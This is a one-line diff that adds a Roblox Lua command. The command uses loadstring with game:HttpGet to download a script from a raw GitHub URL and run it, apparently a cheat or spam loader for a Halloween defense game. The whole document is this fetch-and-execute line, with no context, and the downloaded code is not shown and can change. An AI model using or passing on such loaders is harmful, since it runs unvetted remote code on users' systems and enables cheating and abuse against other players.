@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/halloween-pt2-skibi-defense-spam7-fdq155a8of7ubc.lua"))()
